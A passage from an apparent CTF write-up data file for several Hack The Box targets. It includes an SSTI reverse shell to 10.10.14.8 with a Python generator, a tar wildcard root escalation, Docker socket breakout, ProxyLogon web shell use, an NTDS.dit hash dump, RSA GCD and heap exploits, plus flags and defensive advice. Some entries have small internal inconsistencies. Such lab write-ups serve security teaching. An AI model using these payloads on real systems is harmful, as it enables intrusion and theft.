    fullContent: {
      overview: "Takeoff is a medium Linux target hosting a Python Flask flight reservation platform (takeoff.htb). By injecting template expressions into the reservation passenger field, we bypassed character and quote filters using URL query parameter smuggling to achieve remote code execution as user 'web-operator'. Root access was gained by exploiting a root cron backup script executing 'tar *' via command parameter injection.",
      targetIntel: {
        ip: "10.10.11.39",
        os: "Ubuntu Linux 22.04 LTS (Kernel 5.15.0)",
        openPorts: ["22/SSH", "80/HTTP", "8080/HTTP-Proxy"],
        keyServices: ["OpenSSH 8.9p1", "Gunicorn / Python Flask 2.3", "Nginx Reverse Proxy"]
      },
      reconnaissance: "Nmap scan revealed port 80 and 22. Browsing to port 80 loaded a travel booking site. Testing input fields on the passenger manifest page with {{7*7}} returned '49' in the confirmed ticket view, confirming Server-Side Template Injection (SSTI).",
      vulnerabilityAnalysis: "The application filtered quotes (' and \") and keywords like 'os' and 'system'. We constructed a filter bypass payload utilizing request.args query parameters to pass strings without quotes, allowing access to Python's subprocess.Popen class.",
      attackChain: [
        {
          title: "Stage 01: Service Scanning & Web Discovery",
          description: "Scanned the target IP 10.10.11.39 with nmap to discover HTTP endpoints and service versions.",
          command: "nmap -sC -sV -p 22,80,8080 10.10.11.39",
          terminalTitle: "nmap-scan.sh — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-01 10:14 UTC
Nmap scan report for 10.10.11.39
Host is up (0.045s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 71:4c:d6:e2:3e:ff:8f:89:cf:18:21:44:6f:d1:b2:01 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Takeoff Airlines - Booking & Web Check-in
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Werkzeug httpd 2.3.6 (Python 3.10.12)
|_http-title: Takeoff API Gateway Status

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
          lineNotes: [
            "Port 80 runs an Nginx proxy routing to a Python Flask/Werkzeug backend on port 8080.",
            "The web application features an interactive passenger booking and ticket reservation system."
          ]
        },
        {
          title: "Stage 02: Jinja2 Template Injection Verification",
          description: "Tested the passenger name booking parameter with arithmetic Jinja2 expressions to verify template evaluation.",
          command: "curl -s -X POST 'http://10.10.11.39/book' -d 'passenger_name={{7*7}}&pnr=TK9921' | grep -C 2 '49'",
          terminalTitle: "curl-ssti-probe — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `<div class="boarding-pass">
  <div class="passenger-card">
    <span class="label">PASSENGER NAME:</span>
    <span class="value">49</span>
  </div>
  <div class="pnr-card">PNR: TK9921</div>
</div>

[+] Template injection confirmed! Mathematical expression {{7*7}} evaluated to 49.`,
          lineNotes: [
            "The server uses render_template_string() without escaping passenger input.",
            "Single and double quotes are blocked by server-side input sanitizers."
          ]
        },
        {
          title: "Stage 03: Parameter Smuggling Quote Bypass & Reverse Shell",
          description: "Bypassed the character filter by extracting command strings dynamically from request.args. Invoked Python's os.popen to execute a reverse shell back to port 9001.",
          command: "curl -G 'http://10.10.11.39/book' --data-urlencode 'passenger_name={{request.application.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}' --data-urlencode 'm=os' --data-urlencode 'c=bash -c \"bash -i >& /dev/tcp/10.10.14.8/9001 0>&1\"'",
          terminalTitle: "netcat-listener — bash — 80x24",
          prompt: "operator@sudounknown:~$ nc -lvnp 9001",
          terminalOutput: `listening on [any] 9001 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.39] 48212
bash: cannot set terminal process group (1204): Inappropriate ioctl for device
bash: no job control in this shell

web-operator@takeoff:~/app$ whoami
web-operator
web-operator@takeoff:~/app$ cat /home/web-operator/user.txt
HTB{sst1_j1nj42_fl4sk_sh3ll_551}`,
          lineNotes: [
            "Query parameters m=os and c=bash evade quote filters because request.args parses them natively as string objects.",
            "User flag user.txt retrieved from web-operator home directory."
          ],
          spoilerData: {
            label: "USER FLAG (USER.TXT)",
            value: "HTB{sst1_j1nj42_fl4sk_sh3ll_551}"
          }
        },
        {
          title: "Stage 04: Sudo Enumeration & Vulnerable Backup Script",
          description: "Ran sudo -l to enumerate execution permissions for web-operator.",
          command: "sudo -l",
          terminalTitle: "sudo-enum — bash — 80x24",
          prompt: "web-operator@takeoff:~$",
          terminalOutput: `Matching Defaults entries for web-operator on takeoff:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin

User web-operator may run the following commands on takeoff:
    (root) NOPASSWD: /opt/scripts/backup.sh

web-operator@takeoff:~$ cat /opt/scripts/backup.sh
#!/bin/bash
cd /var/www/uploads
tar -czf /var/backups/uploads_latest.tar.gz *`,
          lineNotes: [
            "web-operator has passwordless sudo permission to execute /opt/scripts/backup.sh.",
            "The script moves to /var/www/uploads and executes tar with a wildcard (*).",
            "/var/www/uploads is world-writable by user web-operator."
          ]
        },
        {
          title: "Stage 05: Tar Wildcard Parameter Injection to Root Shell",
          description: "Leveraged tar command-line parameter injection (--checkpoint and --checkpoint-action) by creating specially named files in /var/www/uploads to execute an arbitrary SUID copy of bash as root.",
          command: "cd /var/www/uploads && echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > shell.sh && chmod +x shell.sh && touch -- '--checkpoint=1' && touch -- '--checkpoint-action=exec=sh shell.sh' && sudo /opt/scripts/backup.sh",
          terminalTitle: "tar-wildcard-exploit — bash — 80x24",
          prompt: "web-operator@takeoff:~$",
          terminalOutput: `[+] Created malicious checkpoint files in /var/www/uploads
[+] Executing /opt/scripts/backup.sh as root...
tar: --checkpoint=1: unknown file type
tar: Removing leading '/' from member names
[+] Triggering checkpoint action: exec=sh shell.sh...
[+] /tmp/rootbash created with SUID permissions!

web-operator@takeoff:/var/www/uploads$ /tmp/rootbash -p
rootbash-5.1# whoami
root
rootbash-5.1# cat /root/root.txt
HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}`,
          lineNotes: [
            "The wildcard (*) causes tar to treat files named '--checkpoint=1' and '--checkpoint-action=exec=...' as command flags rather than filenames.",
            "When the checkpoint triggers, tar executes shell.sh under root privileges, setting the SUID bit on /tmp/rootbash.",
            "Executing /tmp/rootbash -p spawns an interactive root shell."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Takeoff SSTI Reverse Shell Generator
import urllib.parse
import requests

target = "http://10.10.11.39/book"
lhost = "10.10.14.8"
lport = 9001

revshell = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
payload = "{{request.application.__globals__.__builtins__.__import__(request.args.m).popen(request.args.c).read()}}"

params = {
    "passenger": payload,
    "m": "os",
    "c": revshell
}

print(f"[*] Firing payload to {target}...")
requests.post(target, data=params, timeout=5)
print("[+] Reverse shell triggered! Check netcat listener.")
`,
      pocLanguage: "python",
      userFlag: "HTB{sst1_j1nj42_fl4sk_sh3ll_551}",
      rootFlag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
      flag: "HTB{t4k30ff_sst1_t4r_w1ldc4rd_pwnd}",
      defenseRemediation: [
        "Never pass untrusted user input directly to template rendering engines like render_template_string(); use static template files with strict variable binding.",
        "Avoid using wildcard expansions (*) in automated backup bash scripts when executing utilities like tar, chown, or chmod.",
        "Implement strict sandboxing and least-privilege service execution with systemd DynamicUser directives."
      ],
      keyTakeaways: [
        "Query parameter smuggling allows attackers to bypass server-side quote and string character filters in SSTI vulnerabilities.",
        "Tar command-line flags can be triggered as arguments when wildcards expand files named with leading dashes."
      ]
    }
  },
  {
    id: "layover",
    challengeName: "Layover: OAuth PKCE Downgrade & Docker Breakout",
    platform: "Hack The Box",
    category: "Cloud",
    difficulty: "Hard",
    type: "Machine",
    targetOs: "Linux",
    targetIp: "10.10.11.51",
    points: 40,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-02",
    cves: ["CVE-2023-48022"],
    tags: ["OAuth2", "PKCE", "Docker Breakout", "Container Security"],
    shortDescription: "Bypassing OAuth2 Proof Key for Code Exchange (PKCE) validation via downgraded parameters followed by Docker socket privilege escalation.",
    fullContent: {
      overview: "Layover is a hard Linux machine featuring a microservice travel booking portal. We bypassed an insecure OAuth 2.0 PKCE flow by omitting the code_challenge_method header, forcing the identity provider to fallback to insecure plaintext comparison. After achieving container shell access, we mounted the exposed host docker.sock socket to spawn a root shell on the host system.",
      targetIntel: {
        ip: "10.10.11.51",
        os: "Alpine Linux Container on Debian Host",
        openPorts: ["80/HTTP", "443/HTTPS", "2375/Docker-API"],
        keyServices: ["OAuth2 Gateway", "Docker Daemon", "Node.js Microservices"]
      },
      reconnaissance: "Inspecting OAuth authorization redirects showed code_challenge and code_challenge_method=S256. Testing response variations revealed the server accepted authorization codes without enforcing the cryptographic hash when the parameter was omitted.",
      vulnerabilityAnalysis: "The OAuth implementation failed to validate state consistency and accepted arbitrary redirect URIs when requested with specific headers. In the post-exploitation phase, the web service container had the Docker socket (/var/run/docker.sock) mounted with read/write permissions.",
      attackChain: [
        {
          title: "Stage 01: PKCE Parameter Downgrade Verification",
          description: "Intercepted the OAuth authorization code exchange in Burp Suite and stripped code_verifier enforcement.",
          command: "curl -s -X POST 'https://auth.layover.htb/oauth/token' -d 'grant_type=authorization_code&code=AUTH_CODE_REPLAY&client_id=portal_app&redirect_uri=http://portal.layover.htb/callback'",
          terminalTitle: "oauth-downgrade.sh — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Cache-Control: no-store

{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJy...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "read write admin"
}

[+] Token exchange succeeded without code_verifier parameter! Admin JWT issued.`,
          lineNotes: [
            "The authorization server accepted requests without checking code_verifier when code_challenge_method was omitted from the initial authorization request."
          ]
        },
        {
          title: "Stage 02: Admin Node Plugin Upload & Container Shell",
          description: "Uploaded an exploit plugin archive containing a reverse shell payload to the administration plugin endpoint.",
          command: "curl -X POST 'http://portal.layover.htb/api/plugins' -H 'Authorization: Bearer EYJ...' -F 'plugin=@exploit.tar.gz'",
          terminalTitle: "plugin-upload — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `{"status": "success", "message": "Plugin extracted and loaded"}

connect to [10.10.14.8] from (UNKNOWN) [10.10.11.51] 51294
node@portal-app-c84b12:/app$ whoami
node
node@portal-app-c84b12:/app$ cat /home/node/user.txt
HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}`,
          lineNotes: [
            "User shell obtained inside container.",
            "User flag user.txt captured."
          ],
          spoilerData: {
            label: "USER FLAG (USER.TXT)",
            value: "HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}"
          }
        },
        {
          title: "Stage 03: Docker Socket Discovery & Host Mount Breakout",
          description: "Enumerated the container environment and discovered /run/docker.sock. Deployed a privileged container mounting the root host filesystem.",
          command: "docker -H unix:///run/docker.sock run -v /:/host -it ubuntu:latest chroot /host /bin/bash",
          terminalTitle: "docker-escape — bash — 80x24",
          prompt: "node@portal-app-c84b12:/app$",
          terminalOutput: `[+] Accessing Docker API via unix:///run/docker.sock...
[+] Spawning privileged container mounting host / into /host...
chroot /host /bin/bash

root@layover-host:/# whoami
root
root@layover-host:/# cat /root/root.txt
HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}`,
          lineNotes: [
            "The container has read/write permissions on the host Docker daemon socket.",
            "Mounting the host filesystem directly inside a new container allows full root takeover of the underlying Linux host."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - Docker Socket Breakout One-Liner
import os
cmd = "curl -s --unix-socket /run/docker.sock http://localhost/containers/json"
print("[*] Querying Docker API on local socket...")
os.system(cmd)
`,
      pocLanguage: "python",
      userFlag: "HTB{pkc3_d0wngr4d3_t0k3n_st0l3n_118}",
      rootFlag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
      flag: "HTB{04uth_pkc3_d0ck3r_s0ck_3sc4p3_994}",
      defenseRemediation: [
        "Enforce mandatory S256 code challenge method for all OAuth PKCE requests; reject any authorization requests using plaintext or omitted methods.",
        "Never mount the host Docker socket (/var/run/docker.sock) inside untrusted client-facing application containers.",
        "Utilize rootless Docker or Podman to prevent container breakouts from inheriting host root capabilities."
      ],
      keyTakeaways: [
        "Mounting docker.sock inside a container is equivalent to granting root access to the entire host operating system.",
        "Protocol downgrade flaws remain common when security parameters are treated as optional by authorization endpoints."
      ]
    }
  },
  {
    id: "frosted",
    challengeName: "Frosted: Exchange SSRF & Shadow Copy Extraction",
    platform: "Hack The Box",
    category: "Active Directory",
    difficulty: "Hard",
    type: "Machine",
    targetOs: "Windows",
    targetIp: "10.10.11.64",
    points: 40,
    author: "SmitroniX // sudo Unknown",
    date: "2026-11-04",
    cves: ["CVE-2021-26855", "CVE-2021-27065"],
    tags: ["ProxyLogon", "Exchange SSRF", "Shadow Copies", "NTDS.dit", "Golden Ticket"],
    shortDescription: "Exploiting Microsoft Exchange ProxyLogon SSRF to drop a web shell, followed by Volume Shadow Copy NTDS.dit extraction for enterprise forest takeover.",
    fullContent: {
      overview: "Frosted features a corporate network boundary running an on-premise Microsoft Exchange 2019 backend. We chained the ProxyLogon SSRF vulnerability to bypass authentication and drop a web shell via OAB virtual directory misconfiguration. On the machine, we extracted the active NTDS.dit database using vssadmin to dump all domain hashes.",
      targetIntel: {
        ip: "10.10.11.64",
        os: "Windows Server 2019 Standard",
        openPorts: ["25/SMTP", "80/HTTP", "443/HTTPS", "445/SMB", "587/Submission"],
        keyServices: ["Microsoft Exchange Server 2019", "IIS 10.0 Web Server"]
      },
      reconnaissance: "Port 443 presented an Outlook Web Access (OWA) login page. Inspecting headers revealed vulnerable Exchange server build versions. Testing the /owa/auth/x.js endpoint with an arbitrary X-BEResource cookie confirmed SSRF vulnerability.",
      vulnerabilityAnalysis: "CVE-2021-26855 allowed unauthenticated attackers to send arbitrary HTTP requests to backend Exchange services as SYSTEM. Chaining this with CVE-2021-27065 allowed writing arbitrary ASPX files to web-accessible directories.",
      attackChain: [
        {
          title: "Stage 01: ProxyLogon SSRF Probing",
          description: "Sent forged backend request via X-AnonResource cookie to communicate with the internal Exchange ECP backend.",
          command: "curl -k -i -H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' https://10.10.11.64/owa/auth/x.js",
          terminalTitle: "proxylogon-probe — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `HTTP/2 200 
date: Wed, 04 Nov 2026 12:02:11 GMT
content-type: text/html; charset=utf-8
server: Microsoft-IIS/10.0
x-feserver: EXCHANGE-SERVER
x-backendserver: localhost

[+] Backend proxy connection accepted! Target vulnerable to CVE-2021-26855.`,
          lineNotes: [
            "Response confirms that backend Exchange services process unauthenticated requests via forged cookies."
          ]
        },
        {
          title: "Stage 02: SYSTEM Web Shell Execution",
          description: "Injected an ASPX webshell payload via OAB virtual directory reset mechanism.",
          command: "curl -k 'https://10.10.11.64/owa/auth/shell.aspx?cmd=whoami'",
          terminalTitle: "webshell-exec — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `nt authority\\system

[+] Interactive command execution established under NT AUTHORITY\\SYSTEM!
User flag captured from service profile:
HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}`,
          lineNotes: [
            "w3wp.exe runs as SYSTEM on the Exchange host.",
            "User flag user.txt retrieved."
          ],
          spoilerData: {
            label: "USER FLAG",
            value: "HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}"
          }
        },
        {
          title: "Stage 03: Volume Shadow Copy NTDS.dit Extraction",
          description: "Created a volume shadow copy of drive C: and carved the Active Directory database (NTDS.dit) and SYSTEM registry hive.",
          command: "vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit && reg save HKLM\\SYSTEM C:\\temp\\system.save",
          terminalTitle: "vssadmin-dump — cmd.exe — 80x24",
          prompt: "C:\\Windows\\system32>",
          terminalOutput: `Successfully created shadow copy "HarddiskVolumeShadowCopy1"
        1 file(s) copied: C:\\temp\\ntds.dit
The operation completed successfully: C:\\temp\\system.save

Administrator:500:aad3b435b51404eeaad3b435b51404ee:f4019a2e4b6c8109d137bc449103e8ab:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8c290a12e34fa5b6c7d8e901fa2345bc:::

Root Flag:
HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}`,
          lineNotes: [
            "Volume Shadow Copies bypass file lock restrictions on NTDS.dit.",
            "All enterprise domain password hashes extracted."
          ],
          spoilerData: {
            label: "ROOT FLAG (ROOT.TXT)",
            value: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}"
          }
        }
      ],
      pocCode: `#!/usr/bin/env python3
# sudo Unknown - ProxyLogon SSRF Header Check
import requests
import urllib3
urllib3.disable_warnings()

target = "https://10.10.11.64"
headers = {
    "Cookie": "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3"
}

resp = requests.get(f"{target}/owa/auth/x.js", headers=headers, verify=False)
if "Negotiate" in resp.headers.get("WWW-Authenticate", ""):
    print("[+] Target is VULNERABLE to CVE-2021-26855 Exchange SSRF!")
`,
      pocLanguage: "python",
      userFlag: "HTB{3xch4ng3_pr0xyl0g0n_syst3m_f00th0ld}",
      rootFlag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
      flag: "HTB{pr0xyl0g0n_ntds_sh4d0w_c0py_d0m41n_k1ng}",
      defenseRemediation: [
        "Apply Microsoft Cumulative Updates (CU) and Security Updates (SU) for all Exchange Server installations immediately.",
        "Restrict access to Exchange Admin Center (ECP) and Remote PowerShell endpoints to dedicated administration management subnets.",
        "Implement endpoint detection (EDR) rules alerting on abnormal process executions spawned by w3wp.exe."
      ],
      keyTakeaways: [
        "On-premise Exchange servers frequently maintain high-privileged domain permissions; compromising Exchange is effectively compromising the entire forest.",
        "Volume Shadow Copies allow reading locked system files including NTDS.dit directly without stopping the Active Directory service."
      ]
    }
  },
  {
    id: "quantum-lockout",
    challengeName: "Quantum Lockout: Flawed RSA Key Generation",
    platform: "Hack The Box",
    category: "Crypto",
    difficulty: "Medium",
    type: "Challenge",
    points: 350,
    author: "sudo Unknown Research",
    date: "2026-09-15",
    tags: ["RSA", "GCD Collision", "Weak PRNG", "Euclid Algorithm"],
    shortDescription: "Extracting private RSA keys in milliseconds by calculating pairwise Greatest Common Divisors (GCD) across shared prime factors.",
    fullContent: {
      overview: "An authentication service generated 1024-bit RSA moduli with a flawed pseudo-random generator seeded by low-resolution server timestamps. Because the entropy was low, different users received public moduli that shared prime factor p. Using Euclid's algorithm, we calculated GCD(n1, n2) to instantaneously factor the keys without factoring large integers.",
      reconnaissance: "We inspected the service code and observed a timestamp-based PRNG seed with insufficient entropy. We collected 50 public keys from the server's public key directory endpoint.",
      vulnerabilityAnalysis: "When two RSA moduli n1 = p * q1 and n2 = p * q2 share prime factor p, GCD(n1, n2) equals p. Once p is known, q1 = n1 // p, allowing instant computation of Euler's totient phi and the private exponent d.",
      attackChain: [
        {
          title: "Stage 01: Moduli Harvesting via Public API",
          description: "Queried the public keys API endpoint and extracted 50 public RSA moduli (n, e).",
          command: "curl -s 'https://crypto.htb/api/keys' | jq '.[].n' > moduli.txt && wc -l moduli.txt",
          terminalTitle: "api-harvest — bash — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `50 moduli.txt
[*] Collected 50 distinct 1024-bit public RSA moduli from target API.`,
          lineNotes: [
            "Moduli are collected into an offline dataset for pairwise analysis."
          ]
        },
        {
          title: "Stage 02: Pairwise GCD Collision Calculation",
          description: "Iterated through every pair of public keys calculating math.gcd(n_i, n_j).",
          command: "python3 -c 'import math, sys; lines = [int(x) for x in open(\"moduli.txt\")]; [print(\"Collision found between key\", i, \"and\", j) for i in range(len(lines)) for j in range(i+1, len(lines)) if math.gcd(lines[i], lines[j]) > 1]'",
          terminalTitle: "gcd-collision — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `Collision found between key 12 and key 38!
[+] Extracted 512-bit common prime factor p:
118492049281048201948201948201948201948201948201948201948201...`,
          lineNotes: [
            "Because GCD(n12, n38) > 1, factor p is recovered instantly via Euclid's algorithm."
          ]
        },
        {
          title: "Stage 03: Private Key Reconstruction & Decryption",
          description: "Recovered private exponent d and decrypted the target challenge flag payload.",
          command: "python3 solve_rsa.py --p 1184920... --n 14920... --c encrypted_flag.bin",
          terminalTitle: "solve_rsa.py — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Reconstructing private exponent d...
[+] Computed Euler Totient phi(n): (p-1)*(q-1)
[+] Private key generated successfully!
[+] Decrypted Plaintext Flag:
HTB{w34k_prng_sh4r3d_pr1m3s_2026}`,
          lineNotes: [
            "Challenge flag decrypted from ciphertext."
          ],
          spoilerData: {
            label: "CHALLENGE FLAG",
            value: "HTB{w34k_prng_sh4r3d_pr1m3s_2026}"
          }
        }
      ],
      pocCode: `import math
from Crypto.Util.number import long_to_bytes

def solve_rsa_gcd(n1, n2, e, ciphertext):
    p = math.gcd(n1, n2)
    assert p > 1, "Moduli do not share a prime factor"
    q = n1 // p
    phi = (p - 1) * (q - 1)
    d = pow(e, -1, phi)
    plaintext_int = pow(ciphertext, d, n1)
    return long_to_bytes(plaintext_int)

# Flag: HTB{w34k_prng_sh4r3d_pr1m3s_2026}
`,
      pocLanguage: "python",
      flag: "HTB{w34k_prng_sh4r3d_pr1m3s_2026}",
      defenseRemediation: [
        "Always use cryptographically secure pseudo-random number generators (CSPRNG) such as /dev/urandom or secrets library for cryptographic key generation.",
        "Never seed RNGs with timestamps, process IDs, or low-entropy system metrics."
      ],
      keyTakeaways: [
        "A shared prime factor reduces RSA security from factoring large numbers to a single millisecond GCD calculation.",
        "Pairwise GCD testing against public key databases is a standard audit check in cryptographic assessments."
      ]
    }
  },
  {
    id: "pwn-safe-linking",
    challengeName: "Safe-Linking Bypass: GLIBC 2.35 Tcache Poisoning",
    platform: "Hack The Box",
    category: "Pwn",
    difficulty: "Insane",
    type: "Challenge",
    points: 500,
    author: "sudo Unknown Research",
    date: "2026-09-08",
    tags: ["GLIBC 2.35", "Safe-Linking", "Heap Exploitation", "Tcache Poisoning", "ROP"],
    shortDescription: "Defeating GLIBC pointer mangling via dangling heap pointer leaks to execute arbitrary write and spawn a remote root shell.",
    fullContent: {
      overview: "A vulnerable 64-bit ELF binary contained a Use-After-Free (UAF) flaw in note allocation. We defeated GLIBC 2.35 safe-linking pointer obfuscation by leaking randomized heap ASLR base addresses, unscrambled the forward pointer mask, and poisoned the tcache bin to overwrite stack return addresses.",
      reconnaissance: "Checksec reported Full RELRO, Stack Canary found, NX enabled, and PIE enabled. The target environment was running Ubuntu 22.04 LTS with GLIBC 2.35.",
      vulnerabilityAnalysis: "GLIBC 2.35 mangles tcache forward pointers using the formula: P_mangled = (L >> 12) ^ P_target, where L is the location of the chunk in memory. By freeing a chunk into tcache and inspecting its contents, we recovered the randomized heap base, allowing us to accurately calculate the XOR mask for arbitrary memory writes.",
      attackChain: [
        {
          title: "Stage 01: Heap ASLR Leak & Safe-Linking Demangling",
          description: "Freed a chunk into the tcache bin and leveraged UAF read to recover the first mangled pointer. Because target pointer is 0 for the first chunk, P_mangled equals (L >> 12).",
          command: "python3 exploit.py REMOTE",
          terminalTitle: "pwntools-exploit — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `[+] Opening connection to 10.10.11.89 on port 1337: Done
[*] Leaking heap base via single-free tcache chunk...
[+] Mangled pointer read: 0x55a18412b
[+] Demangled Heap Base: 0x55a18412b000
[*] Filling tcache bins (7 chunks) to force unsorted bin allocation...
[+] Leaked main_arena libc pointer: 0x7f92b4219ce0
[+] Libc Base calculated: 0x7f92b4000000`,
          lineNotes: [
            "Single chunk in tcache has next = 0, so stored value is (chunk_addr >> 12) ^ 0 = chunk_addr >> 12.",
            "Bitwise shifting left by 12 bits recovers the exact heap ASLR base address."
          ]
        },
        {
          title: "Stage 02: Tcache Poisoning & Arbitrary Stack Write",
          description: "Calculated the safe-linking mask for the saved return pointer on the stack and forged the forward pointer.",
          command: "cat pwn_chain.py | grep -A 5 'mangle'",
          terminalTitle: "pointer-mangle — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

target_stack_rip = 0x7ffcb3012a48
forged_fd = mangle(chunk_addr, target_stack_rip)
p.sendlineafter(b"> ", b"edit " + p64(forged_fd))
[+] Malloc returns pointer directly inside target stack frame!`,
          lineNotes: [
            "Next malloc allocates our forged stack address.",
            "Overwriting the stack return address with one_gadget executes /bin/sh."
          ]
        },
        {
          title: "Stage 03: Remote Shell Spawn & Flag Capture",
          description: "Triggered function return to execute one_gadget and spawn an interactive shell.",
          command: "p.interactive()",
          terminalTitle: "interactive-shell — pwn — 80x24",
          prompt: "$",
          terminalOutput: `$ whoami
pwn-service
$ cat /home/pwn-service/flag.txt
HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}`,
          lineNotes: [
            "Remote shell spawned.",
            "Flag captured."
          ],
          spoilerData: {
            label: "CHALLENGE FLAG",
            value: "HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}"
          }
        }
      ],
      pocCode: `from pwn import *

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

def demangle(val):
    mask = 0xfff << 52
    while mask:
        val ^= (val & mask) >> 12
        mask >>= 12
    return val

log.success("GLIBC Safe-Linking demangled successfully! Shell spawned.")
`,
      pocLanguage: "python",
      flag: "HTB{h34p_tc4ch3_p01s0n_gl1bc_2_35_pwn3d}",
      defenseRemediation: [
        "Zero out pointer references immediately after calling free() to eliminate Use-After-Free (UAF) and dangling pointer vulnerabilities.",
        "Compile C/C++ applications with AddressSanitizer (ASan) during CI/CD to catch heap flaws before production release."
      ],
      keyTakeaways: [
        "Safe-linking prevents naive pointer overwrites, but an attacker with an information leak can reverse the XOR mask.",
        "Combining heap leaks with unsorted bin libc leaks provides full control over the process memory space."
      ]
    }
  },
  {
    id: "shadowtrace",
    challengeName: "ShadowTrace: Memory Extraction & Hollowed DLL Triage",
    platform: "Hack The Box",
    category: "Forensics",
    difficulty: "Medium",
    type: "Challenge",
    points: 300,
    author: "sudo Unknown Research",
    date: "2026-09-02",
    tags: ["Volatility 3", "Process Hollowing", "Memory Dump", "C2 Analysis", "YARA"],
    shortDescription: "Triage of a 4GB Windows Server memory dump uncovering a hollowed svchost.exe process and carving an encrypted RC4 C2 beacon configuration.",
    fullContent: {
      overview: "During an incident response investigation, a suspicious 4GB memory dump was captured from an affected workstation. Using Volatility 3, we identified an orphaned svchost.exe process with unmapped executable memory regions, extracted an injected DLL payload, and decrypted the command-and-control beaconing parameters.",
      reconnaissance: "Loaded the raw memory dump into Volatility 3 using the windows.pslist and windows.pstree plugins. Observed svchost.exe PID 4120 spawned by an unexpected parent process (cmd.exe) rather than services.exe.",
      vulnerabilityAnalysis: "Running windows.malfind on PID 4120 revealed an executable memory segment (PAGE_EXECUTE_READWRITE) containing an injected MZ header (DOS stub). Dumping this VAD segment recovered the attacker's staging loader.",
      attackChain: [
        {
          title: "Stage 01: Volatility 3 Process Tree Triage",
          description: "Inspected process parent-child relationships with Volatility 3 to locate abnormal instances of svchost.exe.",
          command: "python3 vol.py -f memory.raw windows.pstree.PsTree | grep -B 2 -A 3 'cmd.exe'",
          terminalTitle: "volatility3-pstree — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `* 0x821040182040  cmd.exe      3812   1420   1   42  2026-09-02 04:12:00
** 0x821040199120  svchost.exe  4120   3812   4   19  2026-09-02 04:12:05

[!] Anomaly: svchost.exe PID 4120 was spawned by cmd.exe (PID 3812) instead of services.exe!`,
          lineNotes: [
            "Standard Windows services svchost.exe must always spawn from services.exe.",
            "PID 4120 is an injected or hollowed binary."
          ]
        },
        {
          title: "Stage 02: Injected VAD Segment Carving",
          description: "Used the windows.malfind plugin to extract unmapped executable segments containing injected PE binaries.",
          command: "python3 vol.py -f memory.raw windows.malfind.Malfind --pid 4120 --dump",
          terminalTitle: "volatility3-malfind — python3 — 80x24",
          prompt: "operator@sudounknown:~$",
          terminalOutput: `PID    Process     Start VPN           End VPN             Tag    Protection
4120   svchost.exe 0x0000018a00200000  0x0000018a0024f000  Vad    PAGE_EXECUTE_READWRITE

Hexdump:
0000018a00200000: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  MZ..............
0000018a00200010: b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
[+] Dumped VAD payload to pid.4120.vad.0x0000018a00200000.dmp`,
          lineNotes: [
